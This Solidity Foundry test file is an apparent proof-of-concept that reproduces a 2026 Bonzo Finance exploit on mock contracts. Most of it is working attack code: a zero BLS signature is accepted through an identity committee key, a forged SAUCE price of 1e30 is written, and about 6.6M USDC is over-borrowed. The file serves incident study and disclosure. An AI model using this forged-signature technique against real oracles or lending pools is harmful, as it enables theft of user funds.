// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {MockERC20, VulnerableSupraVerifier, VulnerablePullOracle, MiniBonzoLend} from
    "../sources/VulnerableBLSOracle.sol";

// @KeyInfo - Total Lost : ~$9.05M (Wallet A principal; BlockSec / Bonzo Finance)
// PoC scope : Portable pure-EVM reproduction of the Supra BLS zero-signature
//             acceptance → forged SAUCE price → over-borrow against 250 SAUCE.
//             Historical Hedera numbers: 6,634,528.202695 USDC + 34,518,389.36 WHBAR.
//             This PoC measures USDC-only profit of 6_634_528e6 against a seeded pool.
// Attacker  : 0x9a4966152f6e10b33cb7a37975e8619816d6a494 (Hedera Wallet A / 0.0.10633526)
// Oracle    : Supra pull 0.0.4323024 (0x41ab2059baa4b73e9a3f55d30dff27179e0ea181)
// Verifier  : Supra 0.0.4323006 (impl at attack: 0x63e0a27b…fbf0) — BLS zero-sig
// Pool      : Bonzo LendingPool 0.0.7308459 (0x236897c518996163E7b313aD21D1C9fCC7BA1afc)
// Attack tx : 0xd50c55e24eb8483ec55bf74e84fc9853d0f0fe36f64abdb812a2d9afa2a10a60
//             (Hedera 0.0.995584-1783731093-686041919)
//
// @Info
// Vulnerable locus : requireHashVerified_V2 / BLS.verifySingle missing zero-point checks
//                    before pairing precompile (EIP-197 / Hedera 0.0.8).
//
// @Analysis
// Crypto validation SC bug (NOT a compromised oracle key; contrast Ostium).
// 1. Committee public key[2] was the G2 identity (zeros).
// 2. Attacker submitted verifyOracleProofV2 for pair 425 (SAUCE/WHBAR) with sigs=[0,0].
// 3. Pairing precompile returned true for identity inputs → forged root accepted.
// 4. packData wrote price = 10**30; Bonzo Lend read the feed and allowed massive borrow.
//
// Hedera tooling note: anvil --fork-url https://mainnet.hashio.io/api boots (chainId 295)
// but eth_getCode for long-zero / many system-adjacent contracts returns empty, so a
// full historical replay of the Hedera state is not reliable in Foundry today.
// This PoC is a pure-EVM teaching model that uses the same pairing precompile behaviour
// (proven on both Hedera Hashio and local anvil: zero input → 0x01) and the same
// missing-check structure as requireHashVerified_V2.

address constant ATTACKER = 0x9A4966152F6e10b33Cb7a37975e8619816d6a494;

// Historical root / committee / pair / price from the exploit tx input.
bytes32 constant FORGED_ROOT = 0xd4e6b48aef731cc8cd74b25fbaec267ff8a6269aea1f4be4ee19dda5ecbf3f7f;
uint256 constant COMMITTEE_ID = 2;
uint256 constant PAIR_SAUCE_WHBAR = 425;
uint256 constant FORGED_PRICE = 1e30; // "1 followed by thirty zeroes" (Bonzo report)
uint256 constant COLLATERAL_SAUCE = 250e18;
// Wallet A USDC borrow principal (6 dp)
uint256 constant USDC_BORROWED = 6_634_528_202_695;
// Seed the mini pool with enough USDC for the historical borrow.
uint256 constant POOL_USDC_LIQUIDITY = 10_000_000e6;

// Any recent mainnet block is fine — we only need the BN254 pairing precompile (0x08).
// exhaustive_warm rewrites the alias to mainnet.
uint256 constant FORK_BLOCK = 22_800_000;

contract BonzoLend_exp is BaseTestWithBalanceLog {
    VulnerableSupraVerifier internal verifier;
    VulnerablePullOracle internal oracle;
    MiniBonzoLend internal lend;
    MockERC20 internal sauce;
    MockERC20 internal usdc;

    function setUp() public {
        // Online warm: exhaustive_warm rewrites localhost <-> mainnet alias.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);

        // Deploy the vulnerable stack (portable pure-EVM model of Supra + Bonzo).
        verifier = new VulnerableSupraVerifier();
        // committeePublicKey[2] defaults to (0,0,0,0) — the identity that made
        // the zero-signature pairing succeed on Hedera.
        oracle = new VulnerablePullOracle(verifier);
        sauce = new MockERC20("SAUCE", "SAUCE", 18);
        usdc = new MockERC20("USD Coin", "USDC", 6);
        lend = new MiniBonzoLend(sauce, usdc, oracle);

        // Seed pool liquidity + attacker collateral inventory.
        usdc.mint(address(lend), POOL_USDC_LIQUIDITY);
        sauce.mint(ATTACKER, COLLATERAL_SAUCE);

        fundingToken = address(usdc);
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker (Wallet A)");
        vm.label(address(verifier), "VulnerableSupraVerifier");
        vm.label(address(oracle), "VulnerablePullOracle");
        vm.label(address(lend), "MiniBonzoLend");
        vm.label(address(sauce), "SAUCE");
        vm.label(address(usdc), "USDC");

        // --- Unit proof: pairing precompile accepts the all-zero 12-limb input ---
        {
            uint256[12] memory z;
            uint256[1] memory out;
            bool ok;
            assembly {
                ok := staticcall(gas(), 0x08, z, 0x180, out, 0x20)
            }
            require(ok, "pairing precompile call failed");
            require(out[0] == 1, "pairing did not accept identity input");
            emit log_named_uint("pairing(0..0) =>", out[0]);
        }

        // --- Unit proof: requireHashVerified_V2 accepts sigs=[0,0] for committee 2 ---
        {
            uint256[2] memory zeroSig;
            // Does not revert ⇒ accepted (mirrors live Hedera eth_call on the proxy
            // at the attack block returning empty success for the same arguments).
            verifier.requireHashVerified_V2(FORGED_ROOT, zeroSig, COMMITTEE_ID);
            emit log_string("requireHashVerified_V2(root, [0,0], 2) ACCEPTED");
        }

        uint256 usdcBefore = usdc.balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);

        // 1) Deposit 250 SAUCE collateral (historical: 00:39 UTC Jul 11 2026).
        sauce.approve(address(lend), COLLATERAL_SAUCE);
        lend.depositSauce(COLLATERAL_SAUCE);

        // 2) Submit forged oracle update with zero BLS signature (historical attack tx).
        uint256[2] memory zeroSig;
        oracle.verifyOracleProofV2(
            FORGED_ROOT,
            zeroSig,
            COMMITTEE_ID,
            PAIR_SAUCE_WHBAR,
            FORGED_PRICE,
            block.timestamp
        );

        uint256 feed = oracle.priceOf(PAIR_SAUCE_WHBAR);
        require(feed == FORGED_PRICE, "feed not written");
        emit log_named_uint("forged SAUCE feed (raw)", feed);

        // 3) Borrow historical USDC principal against inflated collateral.
        uint256 maxB = lend.maxBorrowUSDC(ATTACKER);
        require(maxB >= USDC_BORROWED, "max borrow too low for historical size");
        lend.borrowUSDC(USDC_BORROWED);

        vm.stopPrank();

        uint256 profit = usdc.balanceOf(ATTACKER) - usdcBefore;
        assertEq(profit, USDC_BORROWED, "USDC profit mismatch");
        assertEq(lend.usdcDebt(ATTACKER), USDC_BORROWED, "debt mismatch");
        assertEq(usdc.balanceOf(address(lend)), POOL_USDC_LIQUIDITY - USDC_BORROWED, "pool residual");

        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        emit log_named_decimal_uint("Collateral SAUCE", COLLATERAL_SAUCE, 18);
        emit log_named_uint("Committee id", COMMITTEE_ID);
        emit log_named_uint("Pair id (SAUCE/WHBAR)", PAIR_SAUCE_WHBAR);
    }
}
